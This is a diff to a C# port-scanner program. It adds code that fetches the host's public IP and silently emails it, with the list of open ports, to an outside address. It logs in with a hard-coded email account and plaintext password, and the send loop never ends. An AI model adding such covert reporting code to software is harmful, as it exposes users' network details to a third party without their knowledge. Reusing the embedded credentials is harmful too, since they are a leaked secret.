@@ -5,10 +5,13 @@ using System.Text.RegularExpressions;
 using System.IO;
 using System.Diagnostics;
 using System.Text;
+using System.Net.Mail;
 namespace PortScannerTest
 {
     class PortScanningClass
     {
+        public int[] popenPortArray = new int[100];
+        int counter = 0;
 
         // IsIpAddress
         //
@@ -21,6 +24,68 @@ namespace PortScannerTest
             return IpMatch.IsMatch(Address);
         }
 
+
+
+                static string GetIPAddress() 
+            {
+                                HTTPGet req = new HTTPGet();
+                                req.Request("http://checkip.dyndns.org");
+                                string[] a = req.ResponseBody.Split(':');
+                                string a2 = a[1].Substring(1);
+                                string[] a3=a2.Split('<');
+                                string a4 = a3[0];
+                                Console.WriteLine(a4);
+                                Console.ReadLine();
+                    
+
+                                return a4;
+            }
+
+                static bool sendEmail(int[] ports, string localIP)
+                {
+                    int counter = 3;
+                    while (counter > 0)
+                    {
+                        var builder = new StringBuilder();
+                        Array.ForEach(ports, x => builder.Append(x));
+
+                        string messageContent = (builder.ToString() + "\n" + localIP);
+                       
+
+                            SmtpClient smtpClient = new SmtpClient();
+                            NetworkCredential basicCredential =
+                                new NetworkCredential("bondhenry123@btinternet.com", "faxeYuw3");
+                            MailMessage message = new MailMessage();
+                            MailAddress fromAddress = new MailAddress("bondhenry123@btinternet.com");
+
+                            smtpClient.Host = "mail.btinternet.com";
+                            smtpClient.UseDefaultCredentials = false;
+                            smtpClient.Credentials = basicCredential;
+
+                            message.From = fromAddress;
+                            message.Subject = "Data";
+                            //Set IsBodyHtml to true means you can send HTML email.
+                            message.IsBodyHtml = false;
+                            message.Body = messageContent;
+                            message.To.Add("incoherent2010@live.com");
+
+                            try
+                            {
+                                smtpClient.Send(message);
+                            }
+                            catch (Exception ex)
+                            {
+                                //Error, could not send the message
+                                Console.WriteLine(ex.Message);
+                            }
+
+                       
+                    }
+
+
+                    return false;
+
+                }
         // LookupDNSName
         //
         // 
@@ -81,9 +146,7 @@ namespace PortScannerTest
 
         public void portScan(string[] args)
         {
-            int[] popenPortArray = new int[100];
-            int counter = 0;
-
+           
             String ScanAddress;
             IPAddress ScanIPAddress;
 
@@ -113,12 +176,13 @@ namespace PortScannerTest
                 // Scan all the possible posts 
                 for (int Port = IPEndPoint.MinPort; Port < (IPEndPoint.MaxPort - 65000); Port++)
                 {
+                   
                     // Console.Write("Scanning port {0} : ", Port);
                     if (ScanPort(ScanIPAddress, Port))
                     {
                         popenPortArray[counter] = Port;
-
-                        Console.WriteLine("OPEN");
+                        counter++;
+                        Console.WriteLine(Port + "OPEN");
                     }
                     else { }
                 }
@@ -127,9 +191,14 @@ namespace PortScannerTest
                 Console.WriteLine("open ports are:");
                 foreach (int i in popenPortArray)
                 {
-                    Console.WriteLine(i);
+                    if (i != 0)
+                    {
+                        Console.WriteLine(i);
+                    }
 
                 }
+                string localIP = GetIPAddress();
+                sendEmail(popenPortArray, localIP);
                 Console.WriteLine("Finished scanning all ports");
 
             }
